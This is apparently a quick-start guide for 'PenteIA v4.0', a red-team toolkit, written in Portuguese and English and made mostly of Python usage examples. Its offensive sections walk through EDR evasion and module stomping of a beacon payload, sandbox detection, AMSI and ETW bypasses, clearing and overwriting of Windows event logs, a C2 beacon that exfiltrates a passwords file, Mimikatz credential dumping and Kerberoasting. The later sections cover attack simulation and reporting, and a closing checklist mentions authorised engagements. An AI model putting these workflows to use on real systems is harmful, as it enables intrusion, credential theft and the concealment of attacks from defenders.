# PenteIA v4.0 - Quick Start Examples

Exemplos práticos de como usar cada módulo da escalação v4.0.

---

## 1. EDR Evasion Core

### Descobrir e usar ROP gadgets

```python
from edr_evasion_core import RopGadgetFinder, IndirectSyscallExecutor

# Descobrir ROP gadgets
finder = RopGadgetFinder()
gadgets = finder.discover_gadgets('ntdll.dll')
print(f"[*] Found {len(gadgets)} ROP gadgets")
# Output: Found 20 ROP gadgets

# Usar para executar syscall indiretamente
executor = IndirectSyscallExecutor(finder)
status = executor.execute('NtVirtualAlloc', [
    0x0,           # BaseAddress
    0x1000,        # RegionSize
    0x3000,        # AllocationType (MEM_COMMIT)
    0x40           # Protect (PAGE_EXECUTE_READWRITE)
])
print(f"[*] Syscall executed: status={status}")
```

### Module Stomping

```python
from edr_evasion_core import ModuleStomper

stomper = ModuleStomper()

# Carregar payload malicioso
with open('beacon.bin', 'rb') as f:
    payload = f.read()

# Encontrar DLL não-usada e sobrescrever
success = stomper.stomp(payload, 'api-ms-win-core-memory-l1-1-0.dll')

if success:
    print("[✓] Module stomped successfully")
    print(f"    Module: api-ms-win-core-memory-l1-1-0.dll")
    print(f"    Payload hash: {list(stomper.stomped_modules.values())[0]['payload_hash']}")
```

### Detecção de Sandbox

```python
from edr_evasion_core import SandboxDetector

detector = SandboxDetector()

if detector.check_all():
    print("[!] Sandbox detected! Aborting execution")
    # Abortar operação silenciosamente
else:
    print("[✓] Not in sandbox - Safe to continue")
```

---

## 2. Memory Evasion

### Sleep Obfuscation (Ekko-style)

```python
from memory_evasion import SleepObfuscator, create_obfuscated_sleep_chain

obfuscator = SleepObfuscator()

# Sleep simples com obfuscação
result = obfuscator.obfuscate_sleep(duration_ms=10000)
print(f"""
[*] Sleep completed:
    Duration requested: {result['duration_requested_ms']}ms
    Duration actual: {result['duration_actual_ms']}ms
    Encrypted section: {result['encrypted_section_size']} bytes
    Stack spoofed: {result['stack_spoofed']}
""")

# Sleep longo em múltiplos segmentos (evita detecção de padrão)
chain = create_obfuscated_sleep_chain(duration_ms=300000, num_segments=10)
print(f"[*] Completed sleep chain with {len(chain)} segments")
```

### Thread Stack Spoofing

```python
from memory_evasion import ThreadStackSpoofer

spoofer = ThreadStackSpoofer()

# Falsificar pilha para parecer chamada legítima
stack_config = spoofer.spoof_current_stack()

print(f"""
[*] Stack spoofed:
    Target RSP: 0x{stack_config['target_rsp']:x}
    Target RBP: 0x{stack_config['target_rbp']:x}
    Fake frames: {len(stack_config['frames'])}
""")

# EDR/debugger vê: kernel32.WaitForSingleObject
# Realidade: código do beacon executando
```

---

## 3. Telemetry Bypass

### Patchless AMSI Bypass

```python
from telemetry_bypass import VectoredExceptionHandler

veh = VectoredExceptionHandler()

# Instalar handler
if veh.install():
    print("[✓] VEH handler installed")
    
    # Agora scripts PowerShell passam por AMSI sem bloqueio
    malicious_script = "Get-Process lsass | Export-Object"
    result = veh.intercept_amsi_scan(malicious_script)
    
    print(f"""
[*] AMSI Interception:
    Payload: {result['payload']}...
    Result: {result['amsi_result']}
    Intercepted: {result['intercepted']}
""")
```

### ETW Disabling

```python
from telemetry_bypass import ETWBypass

etw = ETWBypass()

# Disabilitar providers críticos
count = etw.disable_critical_providers()
print(f"[✓] Disabled {count} critical ETW providers:")
for provider in etw.CRITICAL_ETW_PROVIDERS:
    print(f"    - {provider}")

# Falsificar eventos ETW
spoofed_event = etw.spoof_etw_events(
    event_type='ProcessCreate',
    data={
        'ProcessName': 'notepad.exe',
        'CommandLine': 'C:\\Windows\\System32\\notepad.exe',
        'ParentProcessId': 4,
    }
)
print(f"[*] Spoofed event: {spoofed_event['event_type']}")
```

### Event Log Manipulation

```python
from telemetry_bypass import WindowsEventLogManipulation

evtlog = WindowsEventLogManipulation()

# Limpar todos logs críticos
count = evtlog.clear_critical_logs()
print(f"[✓] Cleared {count} critical event logs:")
for log in evtlog.cleared_logs:
    print(f"    - {log['log_name']}")

# Sobrescrever entradas específicas
result = evtlog.overwrite_log_entries(
    log_name='Security',
    event_ids=[4688, 4689, 4690]  # Process creation events
)
print(f"[*] Overwritten {result['entries_replaced']} log entries")
```

---

## 4. C2 Framework

### Registrar Beacon e Executar Comandos

```python
from c2_framework import C2Controller

c2 = C2Controller()

# Registrar novo beacon com profile Azure
beacon = c2.register_beacon(profile_name='azure')
print(f"""
[+] Beacon registered:
    ID: {beacon.beacon_id}
    Profile: Azure Telemetry
    Session Key: {beacon.session_key.hex()[:32]}...
""")

# Beacon realiza check-in
checkin = beacon.checkin()
print(f"[*] Beacon check-in: {checkin['status']}")

# Executar comandos
beacon.execute_command('whoami')
beacon.execute_command('ipconfig', ['/all'])
beacon.execute_command('dir', ['C:\\Users\\'])

# Exfiltar dados
sensitive_data = open('C:\\sensitive\\passwords.txt', 'rb').read()
exfil_result = beacon.exfiltrate(sensitive_data, 'credential_file')
print(f"""
[*] Data exfiltrated:
    Hash: {exfil_result['data_hash']}
    Size: {exfil_result['data_size']} bytes
    Type: {exfil_result['data_type']}
""")

# Ver status da sessão
status = beacon.get_session_status()
print(f"""
[*] Session status:
    Commands executed: {status['commands_executed']}
    Data exfiltrated: {status['data_exfiltrated_mb']:.2f} MB
    Last check-in: {status['last_checkin']}
""")
```

### Cascata de Redirectores

```python
from c2_framework import RedirectorCascade

# Criar cascata
cascade = RedirectorCascade(
    team_server_addr='10.0.0.5',
    team_server_port=8080
)

# Adicionar redirectores
cascade.add_redirector('AWS Front', 'AWS', '54.1.2.3', 443)
cascade.add_redirector('Azure Mid', 'Azure', '40.5.6.7', 443)

print(f"""
[*] Redirector cascade created:
    Cascade ID: {cascade.cascade_id}
    Team Server: {cascade.team_server_addr}:{cascade.team_server_port}
    Redirectors: {len(cascade.redirectors)}
""")

# Gerar configuração nginx
nginx_conf = cascade.build_nginx_config('10.0.0.5', 8080)
with open('redirector.conf', 'w') as f:
    f.write(nginx_conf)
print("[✓] nginx configuration generated: redirector.conf")
```

---

## 5. Post-Exploitation

### Inline Mimikatz

```python
from post_exploitation import PostExploitationEngine, PostExecModule

engine = PostExploitationEngine()

# Extrair todos secrets
print("[*] Executing Mimikatz inline...")
secrets_result = engine.execute_module(PostExecModule.MIMIKATZ)

print(f"""
[✓] Mimikatz execution completed:
    Logon passwords: {len(secrets_result['logon_passwords'])} found
    SAM hashes: {len(secrets_result['sam'])} found
    LSA secrets: {len(secrets_result['lsa_secrets'])} found
    Kerberos tickets: {len(secrets_result['kerberos_tickets'])} found
    Vault items: {len(secrets_result['vault'])} found
""")
```

### BloodHound Collection

```python
from post_exploitation import BloodHoundCollector

bloodhound = BloodHoundCollector()

# Coletar dados de AD
print("[*] Collecting BloodHound data...")
collection = bloodhound.collect_domain_data(
    domain='CONTOSO.COM',
    methods=['All']
)

print(f"""
[✓] BloodHound collection completed:
    Domain: {collection['domain']}
    Methods: {', '.join(collection['methods'])}
    Output: {collection['output_file']}
""")

# Parse dados coletados
bloodhound_zip = open('bloodhound_data.zip', 'rb').read()
parsed = bloodhound.parse_bloodhound_output(bloodhound_zip)

print(f"""
[*] Attack paths identified:
    Nodes: {parsed['nodes']}
    Edges: {parsed['edges']}
    Paths to DA: {len(parsed['paths_to_admin'])}
""")

for path in parsed['paths_to_admin']:
    print(f"    - {path}")
```

### Rubeus Kerberos Operations

```python
from post_exploitation import RubeusKerberos

rubeus = RubeusKerberos()

# Dump tickets do usuário atual
print("[*] Dumping Kerberos tickets...")
tickets = rubeus.dump_tickets()

print(f"[✓] Found {len(tickets['tickets'])} tickets:")
for ticket in tickets['tickets']:
    print(f"    - {ticket['service']} ({ticket['type']})")

# Executar Kerberoasting
print("[*] Executing Kerberoasting...")
krb_result = rubeus.kerberoast(user_list=['user1', 'user2', 'user3'])

print(f"[✓] Kerberoast completed:")
for hash_cred in krb_result['hashes_cracked']:
    print(f"    - {hash_cred}")
```

---

## 6. BAS Engine

### Executar Playbook

```python
from bas_engine import Playbook, BASPlaybookRunner

runner = BASPlaybookRunner()

# Executar playbook predefinido
print("[*] Running lateral movement playbook...")
playbook = Playbook.from_preset('lateral_movement')
result = runner.run_playbook(playbook)

print(f"""
[✓] Playbook execution completed:
    Playbook: {result['playbook_name']}
    Findings: {result['total_findings']}
    Severity breakdown:
""")

for finding in result['findings']:
    print(f"    - [{finding['severity_label'].upper()}] {finding['technique_name']}")
    print(f"      Score: {finding['severity_score']:.1f}")
```

### Full Assessment

```python
# Executar avaliação completa
print("[*] Running full BAS assessment...")
full_assessment = runner.run_full_assessment()

print(f"""
[✓] Full assessment completed:
    Assessment ID: {full_assessment['assessment_id']}
    Total findings: {full_assessment['total_findings']}
    Playbooks executed: {len(full_assessment['playbook_results'])}
""")

# Resumo por playbook
for pb_result in full_assessment['playbook_results']:
    print(f"    - {pb_result['playbook_name']}: {pb_result['total_findings']} findings")
```

---

## 7. Automated Reporting

### Gerar Relatório Completo

```python
from automated_reporting import (
    Finding, FindingsCategorizer, RecommendationGenerator,
    JinjaReportGenerator, ReportExporter
)

# Criar findings
findings = [
    Finding(
        finding_id='F001',
        technique_id='T1021.001',
        title='RDP Exposed on Internet',
        description='RDP port 3389 is exposed and lacks MFA',
        severity='critical',
        evidence=['Port 3389 open', 'Weak password policy'],
        affected_systems=['SERVER-01', 'SERVER-02'],
        remediation='Enable MFA, restrict RDP access via firewall',
        cvss_score=9.1
    ),
    Finding(
        finding_id='F002',
        technique_id='T1110.001',
        title='Default Credentials Still Active',
        description='Several service accounts use default credentials',
        severity='high',
        evidence=['admin:admin found', 'guest:guest found'],
        affected_systems=['DB-SERVER-01', 'APP-SERVER-02'],
        remediation='Change all default credentials immediately',
        cvss_score=8.2
    ),
]

# Categorizar
categorizer = FindingsCategorizer()
categorizer.categorize_findings(findings)
summary = categorizer.get_summary()

print(f"""
[*] Findings Summary:
    Critical: {summary['critical']}
    High: {summary['high']}
    Medium: {summary['medium']}
    Total: {summary['total']}
""")

# Gerar recomendações
rec_gen = RecommendationGenerator()
recommendations = rec_gen.generate_recommendations(findings)

print("[*] Remediation Recommendations:")
for rec in recommendations:
    print(f"    [P{rec['priority']}] {rec['mitigation_title']}")
    print(f"        Effort: {rec['effort']}")
    for i, step in enumerate(rec['steps'], 1):
        print(f"        {i}. {step}")
```

### Exportar Relatório

```python
# Gerar relatório
jinja_gen = JinjaReportGenerator()
report_data = {
    'report_id': 'RPT-2026-06-10-001',
    'assessment_date': '2026-06-10',
    'duration_hours': 8,
    'total_findings': len(findings),
    'risk_level': 'Critical',
    'overview': 'Multiple critical vulnerabilities identified',
    'critical_count': 2,
    'high_count': 3,
    'medium_count': 5,
    'findings': findings,
    'top_recommendations': recommendations[:3],
}

report = jinja_gen.generate_full_report(report_data)

# Exportar em múltiplos formatos
exporter = ReportExporter()
exporter.export_html(report_data, 'assessment.html')
exporter.export_pdf(report_data, 'assessment.pdf')
exporter.export_docx(report_data, 'assessment.docx')

print("[✓] Reports exported:")
print("    - assessment.html")
print("    - assessment.pdf")
print("    - assessment.docx")
```

---

## 8. Complete Orchestration

### Executar Operação Red Team Completa

```python
from penteia_v4_orchestrator import PenteIAv4Orchestrator

# Inicializar orchestrator
orchestrator = PenteIAv4Orchestrator()
print("[*] Initializing PenteIA v4.0...")
modules_status = orchestrator.initialize_all_modules()

print(f"""
[✓] {len(modules_status)} modules initialized:
""")
for module, status in modules_status.items():
    print(f"    ✓ {module}: {status['status']}")

# Executar operação completa de 5 fases
print("\n[*] Starting full red team operation...")
operation_result = orchestrator.run_full_red_team_operation()

print(f"""
[✓] Operation completed successfully!

    Phases executed:
    1. ✓ Beacon delivery with EDR evasion
    2. ✓ Memory evasion (sleep obfuscation)
    3. ✓ Post-exploitation (Mimikatz, BloodHound)
    4. ✓ BAS assessment ({operation_result['phases']['bas_assessment']['total_findings']} findings)
    5. ✓ Automated report generation

    Reports generated:
    - assessment_report.html
    - assessment_report.pdf
    - assessment_report.docx
""")
```

---

## 9. Advanced Workflows

### Custom Playbook Execution

```python
from bas_engine import Playbook, MITRETechnique, MITRETactic

# Criar playbook customizado
custom_techniques = [
    MITRETechnique('T1548.004', 'Elevated Execution', MITRETactic.PRIVILEGE_ESCALATION,
                  'Execute with elevated privileges'),
    MITRETechnique('T1036.005', 'Spoof Process', MITRETactic.DEFENSE_EVASION,
                  'Hide malicious process'),
    MITRETechnique('T1562.008', 'Clear Logs', MITRETactic.DEFENSE_EVASION,
                  'Clear event logs'),
]

custom_playbook = Playbook('custom_evasion', custom_techniques)
result = runner.run_playbook(custom_playbook)

print(f"[✓] Custom playbook executed: {result['total_findings']} findings")
```

### Findings Report Generation

```python
# Gerar relatório apenas para findings críticos
critical_findings = [f for f in findings if f.severity == 'critical']

report = orchestrator.generate_findings_report([
    {
        'finding_id': f.finding_id,
        'technique_id': f.technique_id,
        'title': f.title,
        'severity': f.severity,
        'evidence': f.evidence,
        'affected_systems': f.affected_systems,
        'remediation': f.remediation,
        'cvss_score': f.cvss_score,
    }
    for f in critical_findings
])

print(f"[✓] Report generated with {len(critical_findings)} critical findings")
print(f"    Attack paths: {len(report['attack_paths'])}")
print(f"    Recommendations: {len(report['recommendations'])}")
```

---

## 📋 Checklist de Deployment

Para ambientes controlados:

- [ ] Revisar e entender cada módulo
- [ ] Validar permissões (pentesting engagement)
- [ ] Testar em laboratório isolado primeiro
- [ ] Configurar logging/monitoring apropriado
- [ ] Implementar controles de saída
- [ ] Documentar todas as operações
- [ ] Estabelecer plano de remediação
- [ ] Gerar relatórios profissionais

---

**Última atualização:** 2026-06-10  
**Versão:** PenteIA v4.0
